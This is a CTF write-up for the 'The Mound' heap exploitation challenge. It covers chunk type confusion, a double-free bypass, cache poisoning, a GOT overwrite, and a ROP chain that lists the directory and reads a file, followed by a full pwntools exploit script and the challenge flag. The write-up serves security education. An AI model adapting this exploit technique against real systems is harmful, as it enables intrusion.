@@ -1,0 +1,280 @@
+<!--Solve date: 09/09/2021-->
+
+<h1>WinRaRs CTF 2021 - The Mound</h1>
+
+<h2>Binary Exploitation - 800 pts</h2>
+
+<h3>Writeup by YR81</h3>
+
+<h4>Discussion</h4>
+
+<h5>Overview</h5>
+
+<p>The name of the challenge is synonymous with heap, and this hints at a heap-related exploit. The description of the challenge claims the "glibc heap is too insecure. <i>I took matters into my own hands and swapped efficiency for security</i>". Heap challenge descriptions are always a little weird, but this one seems to suggest that there is a <i>custom</i> heap implementation to play with.</p>
+
+<p>Indeed, the binary implements its own heap ("mound"). The data section of the mound is obtained through <code>mmap()</code> of size 1024 pages with base address <code>0xbeef0000000</code>, and the mound metadata is also obtained through <code>mmap()</code>, with a nominal size of 0x8018 (of course, the size will be rounded to 0x9000 to align with page granularity) and a base address <code>0xdead0000000</code>. In reverse engineering heap implementations, often the most challenging task is determining structures of heap objects, primarily, chunks and bins. By carefully looking through the way that chunks are taken from the top and returned to the user, we can deduce the following structure for a <i>chunk</i>:</p>
+
+<img src = "./images/rarctf2021_themound_1.png" class = "small"/>
+
+<p class = "caption">Figure 1. Structure of a chunk in the mound.</p>
+
+<p>The first field, denoted <code>a</code> in the listing above, is an ID that is initialized whenever a chunk is carved from the top chunk. This ID is saved in an array in the mound metadata whenever the chunk is freed to the cache, and removed from that array when the chunk is reallocated from the cache. The purpose of the ID is to prevent double-frees. The idea is that if a chunk has been freed to the cache but not yet reallocated, it cannot be freed again.</p>
+
+<img src = "./images/rarctf2021_themound_2a.png" class = "small"/>
+
+<img src = "./images/rarctf2021_themound_2b.png" class = "small"/>
+
+<img src = "./images/rarctf2021_themound_2c.png" class = "small"/>
+
+<p class = "caption">Figure 2. (a) Procedure to allocate from the top chunk. The highlighted line sets the <code>a</code> field of the chunk. (b) Function <code>register_id()</code> called by <code>mcache_free()</code>, which frees chunks to the cache. A chunk's ID field is added to the heap array (if there is room). (c) Function <code>find_id()</code> called by the custom free routine before a chunk is submitted to the cache. The highlighted conditional block is executed whenever a chunk about to be freed has an <code>a</code> field that is already in the ID array.</p>
+
+<p>The size of the chunk is at offset 8 (see Fig. 1). Like the glibc heap, the size is the <i>total</i> size of the chunk, including the (16-byte) metadata. <i>For a mound chunk,</i> the maximum size of the data in-use is 16 less than the chunk size. When the chunk is freed, the first two qwords in the data field are used as pointers - one to the base of the <i>cacheMap</i> bin structure and the other to the <i>next</i> chunk in the bin.</p>
+
+<p>The overall heap metadata and cache bins have the following structure:</p>
+
+<img src = "./images/rarctf2021_themound_3.png" class = "small"/>
+
+<p class = "caption"> Figure 3. Heap metadata (at <code>0xdead0000000</code>) and the cache bins.</p>
+
+<p>The base address of the heap is stored at offset zero in the overall metadata. Following the pointer to the base, there is a 0x1000-size array that contains the IDs discussed previously. Following this array, there is a pointer to the cache bins (cacheMap), and finally a pointer to the top chunk in the heap.</p>
+
+<p>The cacheMap is allocated a chunk in the heap itself and is composed of two parts - a 24-byte array with the sizes of the lists of the caches, and a 24-qword array with pointers to either null (if the cache is empty) or the head of the cache. The cache is a singly-linked list, where the most newly freed chunks are appended at the head of the list.</p>
+
+<p>The custom heap implementation has size limitations for allocations and frees. The heap does not grow to fulfill additional allocations and no additional <code>mmaps()</code> are allowed. Only small chunks can be freed - chunks that are small enough to be stored in the cache. There are some problems with the allocator in terms of size. It is possible to allocate chunks with zero (or even negative) data size provided that the proper entries in the cacheMap sizes and pointers are nonzero, but these chunks cannot be freed and are not exploitable in this application.</p>
+
+<img src = "./images/rarctf2021_themound_4.png" class = "small"/>
+
+<p class = "caption">Figure 4. The alloctor for the custom heap. The chunk and data size variables are declared as signed integers, which would allow for negative sizes.</p>
+
+<p>The application itself is quite simple. There are 4 useful actions: (1) add sand (see Fig. 5), which copies up to 0x100 bytes of user input to an actual heap chunk via <code>strdup()</code> and records the size of the chunk; (2) add dirt, which calls the custom memory allocation routine and initializes the returned chunk with user input; (3) replace dirt, which replaces the contents of a chunk; and (4) remove dirt, which calls the custom free and sets the size of the chunk to zero. Unlike chunks obtained by "add sand", chunks obtained by "add dirt" have their size set to zero upon initialization and cannot have their contents changed. In addition, removing dirt does not clear the pointer in the application memory, and it also does not check that the chunk is actually dirt - i.e., that it was obtained from the custom allocator.</p>
+
+<img src = "./images/rarctf2021_themound_5.png" class = "small"/>
+
+<p class = "caption">Figure 5. "Add sand" uses <code>strdup()</code> to copy the user input, which takes a chunk allocated by glibc.</p>
+
+<h5>Chunk Type Confusion to Overwrite ID</h5>
+
+<p>The exploitable vulnerability in this application is <i>type confusion</i> of mound chunks with glibc chunks. Type confusion is familiar in other contexts, particularly in applications at a higher layer of abstraction, such as webapps. Type confusion can lead to misuse of objects and in this application, the ID check to be bypassed, resulting in a double-free and eventually write-what-where.</p>
+
+<p>The problem is the strange (but arguably efficient) glibc chunk structure. Glibc chunks (in x64) can hold a maximum data size of 1 qword less than the chunk size when they are in-use. That is, a 0x20-chunk can hold up to 0x18 (24) bytes of actual data. Technically speaking, the data is overflowing into the next chunk's header. But in glibc, the LSB of the size field (which isn't used to determine size, since chunks must be paragraph-aligned) denotes whether the previous chunk is in use. If it is in use, glibc heap management refrains from interpreting the field at offset 0 within the chunk as metadata. When the chunk is <i>free</i>, however, the field at offset 0 holds a copy of the size of the previous chunk. This is convenient because the address of the previous chunk (sequentally in memory) can be calculated simply by subtracting this value from the address of the current chunk.</p>
+
+<img src = "./images/rarctf2021_themound_6a.png" class = "small"/>
+
+<img src = "./images/rarctf2021_themound_6b.png" class = "small"/>
+
+<p class = "caption">Figure 6. (a) Structure of a 0x20-chunk while it is in use. (b) Structure of a 0x20-chunk that has been fully freed (i.e., not residing in either tcache or a fastbin). The two unlabeled data fields are used to point to <code>prev</code> and <code>next</code> in doubly-linked lists in smallbin.</p>
+
+<p>The problem is that the mound free procedure will happily "free" a glibc chunk obtained from <code>strdup()</code> in "add sand". It will think that the ID field is safe, because for chunks allocated by the mound allocator, that field <i>is</i> safe. But glibc chunks don't obey that rule. As shown in Fig. 6, they have 0x18 bytes of free realm compared to 0x10 data bytes for the mound chunk. So, consider the following sequence of operations.</p>
+
+<ul>
+    <li><p>Add sand (#1), and enter a 20-byte (0x14) string. The last 4 bytes overlap with the ID of the next chunk, if interpreted as a mound chunk.</p></li>
+    <li><p>And another sand (#2), and enter anything. Note that when this glibc chunk is free by the mound free, it will be confused for a mound chunk. We have control over the "ID" field.</p></li>
+    <li><p>Free sand #2 with mound free.</p></li>
+    <li><p>Replace the contents of the first sand chunk (#1), such that the last 4 bytes of the 20-byte string is different than before. We have effectively changed the ID field of the freed #2.</p></li>
+</ul>
+
+<h5>Double-Free and Poison Mound Cache</h5>
+
+<p>After modifying the ID field, we are now able to free the second sand (#2) <i>again</i>, bypassing the double-free check. Allocating multiple times returns identical chunks. This is useful because duplicate chunks allow us to poison the cache from an allocated chunk. We perform the following operations:</p>
+
+<ul>
+    <li>
+        <p>Free sand #2 with mound free again. The internal mound 0x20-cache now looks like the following:</p>
+        <p><code>mcache[0x20] -> #2 -> #2 -> (...)</code></p>
+    </li>
+    <li><p>Add 0x10-size dirt (#3), which will be allocated from the old #2 in cache. Write the address of the cacheMap (<code>0xbeef0000010</code>) to the first qword, and 0x10 less than the cacheMap pointer in the mound metadata (<code>0xdead0008008 - 0x10 = 0xdead0007ff8</code>) to the second qword.</p></li>
+    <li><p>Add another 0x10-size dirt (#4), which will be allocated in the exact same spot as #3 (and the old #2). Now, the 0x20-mcache is poisoned; the next chunk to be allocated will be in the mound metadata.</p></li>
+</ul>
+
+<p>The next allocation will be a fake chunk in the mound metadata.</p>
+
+<h5>Overwrite Top and Obtain Write-What-Where</h5>
+
+<p>At this point, we have a chunk that allows us to control the top chunk of the mound. To finish the heap exploit, we simply direct this to the global offset table, which is writable due to only partial-RELRO hardening. This is accomplished by the following.</p>
+
+<ul>
+    <li><p>Add 0x10-size dirt (#5), which will be allocated in the mound metadata. Note that we pass the verify check in mound allocate because there is a cacheMap pointer in the correct field of this fake chunk. Further, the mound allocator does not check alignment, so even though the chunk is not paragraph-aligned, the operation succeeds.</p></li>
+    <li><p>In the first qword of #5, it doesn't hurt to simply rewrite the cacheMap pointer. In the top chunk field, we put the address of <code>srand()</code> within the global offset table. We can overwrite all the entries following it with <code>win()</code>.</p></li>
+    <li><p>Request a 0x30-size dirt (#6). Such a chunk size has never been allocated before, so this will be serviced from top (which is now pointing within the global offset table).</p></li>
+    <li><p>Submit 6 copies of <code>win()</code> in dirt chunk #6, which overwrites <code>srand()</code>, <code>prctl()</code>, <code>time()</code>, <code>setvbuf()</code>, <code>perror()</code>, and <code>__isoc_99_scanf()</code>. The next time one of these is called, the vulnerable function <code>win()</code> will be entered.</p></li>
+</ul>
+
+<h5>ROP and Ret2Libc with Restricted Syscalls</h5>
+
+<p>The next time the menu is printed and the user is prompted to input an option, <code>scanf()</code> is hooked and we are redirected to <code>win()</code>. This is a nice function that allows for a typical ROP / Ret2Libc exploit. However, we cannot simply return to <code>system()</code>, since <code>execve()</code> is banned.</p>
+
+<img src = "./images/rarctf2021_themound_7.png" class = "small"/>
+
+<p class = "caption">Figure 7. <code>win()</code> function reached after heap exploit.</p>
+
+<p>There are several ways to exploit the process at this point. I opted for the classic leak libc, return to vuln, and submit a second payload. Since the flag is renamed to some random 16-byte hexstring, we first have to print the directory contents, which we can do with the <code>getdents</code> (<b>get</b> <b>d</b>irectory <b>ent</b>rie<b>s</b>) syscall. Then, we can request user input for the file to read. For the full details, see the exploit script below.</p>
+
+<h4>Payload</h4>
+
+<pre class = "python">
+from pwn import *
+
+ready = True
+debug = True
+if ready:
+    target, port = "193.57.159.27", 30078
+    p = remote(target, port)
+    libc = ELF("../libc.so.6")
+    poprsi_ret_offs_libc = 0x27529
+    poprax_ret_offs_libc = 0x4a550
+    syscall_ret_offs_libc = 0x66229
+    poprdx_popr12_ret_offs_libc = 0x11c371
+else:
+    procname = "./mound"
+    p = process(procname)
+    libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+    poprsi_ret_offs_libc = 0x23e8a
+    poprax_ret_offs_libc = 0x43a78
+    syscall_ret_offs_libc = 0xe5945
+    poprdx_popr12_ret_offs_libc = 0x130864
+    if debug:
+        context.terminal = ["/mnt/c/Users/********/wsl-terminal/open-wsl.exe", "-e"]
+        gdb.attach(p, gdbscript = """
+        b *0x401cad
+        """)
+
+
+
+# exploit goes here
+# lambdas and funcdefs
+flush = lambda: p.recvuntil(b"> ")
+flush2 = lambda: p.recvuntil(b": ")
+sendint = lambda x: p.sendline(bytes(str(x), "utf-8"))
+send = lambda bs: p.send(bs)
+
+def newSand(idx, stuff):
+    idx %= 0x1000
+    flush()
+    sendint(1)
+    flush2()
+    send(stuff)
+    flush2()
+    sendint(idx)
+    return
+
+def newDirt(idx, size, stuff):
+    idx %= 0x1000
+    if len(stuff) > size:
+        stuff = stuff[: size]
+
+    flush()
+    sendint(2)
+    flush2()
+    sendint(size)
+    flush2()
+    sendint(idx)
+    flush2()
+    send(stuff)
+    return
+
+def reSand(idx, stuff):
+    idx %= 0x1000
+    flush()
+    sendint(3)
+    flush2()
+    sendint(idx)
+    flush2()
+    send(stuff)
+    return
+
+def free(idx):
+    idx %= 0x1000
+    flush()
+    sendint(4)
+    flush2()
+    sendint(idx)
+    return
+
+def triggerBP():
+    flush()
+    sendint(5)
+
+
+puts_plt = 0x401030
+win = 0x4017f7
+ret = 0x401823
+poprdi_ret = 0x401e8b
+testStr = 0x4020c8
+puts_got = 0x404018
+srand_got = 0x404050
+cacheMap = 0xbeef0000010
+writable = 0xbeef0001000
+mcachePtr = 0xdead0008008
+
+# payloads
+# first, we need to create two identical chunks
+#newDirt(0, 0x10, 0x10 * b'\x00')                #dummy chunk
+#free(0)
+newSand(1, 0x10 * b'\x01' + p32(0xcafebabe))
+newSand(2, 0x10 * b'\x02' + p32(0xebabefac))
+free(2)
+reSand(1, 0x10 * b'\x01' + p32(0xebabefac))
+free(2)
+
+# allocate one of them and overwrite the free fields
+# faking a chunk in heap structure
+newDirt(3, 0x10, p64(cacheMap) + p64(mcachePtr - 0x10))
+
+# overwrite GOT
+newDirt(4, 0x10, 0x10 * b'\x04')                #after this, head is in heap structure
+newDirt(5, 0x10, p64(cacheMap) + p64(srand_got))
+newDirt(6, 0x30, 6 * p64(win))
+
+# at this point, it's a standard ret2libc
+p.recvuntil(b";)\n")
+p.send(0x40 * b'\x01' + p64(0xdeadbeef) + p64(poprdi_ret) + p64(puts_got) + p64(puts_plt) + p64(win))
+libc.address = u64(p.recv(6).ljust(8, b'\x00')) - libc.sym["puts"]
+p.recvline()
+log.info("Libc: %s" % (hex(libc.address)))
+p.recvline()
+p.send(0x40 * b'\x01' + p64(0xdeadbeef) + 
+        p64(poprdi_ret) + p64(0) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(1) + p64(0xdeadbeef) + 
+        p64(libc.sym["read"]) +
+        p64(poprdi_ret) + p64((1 << 64) - 100) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0) + p64(0xdeadbeef) + 
+        p64(libc.sym["openat"]) + 
+        p64(poprdi_ret) + p64(3) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable + 0x1000) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0x400) + p64(0xdeadbeef) + 
+        p64(poprax_ret_offs_libc + libc.address) + p64(0x4e) + 
+        p64(syscall_ret_offs_libc + libc.address) + 
+        p64(poprdi_ret) + p64(1) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable + 0x1000) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0x100) + p64(0xdeadbeef) + 
+        p64(libc.sym["write"]) + 
+        p64(poprdi_ret) + p64(0) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(36) + p64(0xdeadbeef) + 
+        p64(libc.sym["read"]) + 
+        p64(poprdi_ret) + p64((1 << 64) - 100) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0) + p64(0xdeadbeef) + 
+        p64(libc.sym["openat"]) + 
+        p64(poprdi_ret) + p64(4) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable + 0x2000) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0x40) + p64(0xdeadbeef) + 
+        p64(libc.sym["read"]) + 
+        p64(poprdi_ret) + p64(1) + 
+        p64(poprsi_ret_offs_libc + libc.address) + p64(writable + 0x2000) + 
+        p64(poprdx_popr12_ret_offs_libc + libc.address) + p64(0x100) + p64(0xdeadbeef) + 
+        p64(libc.sym["write"]) + 
+        p64(poprdi_ret) + p64(testStr) + 
+        p64(puts_plt) + 
+        p64(libc.sym["exit"]))
+
+p.send(b".")
+
+p.interactive()
+</pre>
+
+<h4>Flag</h4>
+
+<p><code>rarctf{all0c4t0rs_d0_n0t_m1x_e45a1bf0b2}</code></p>
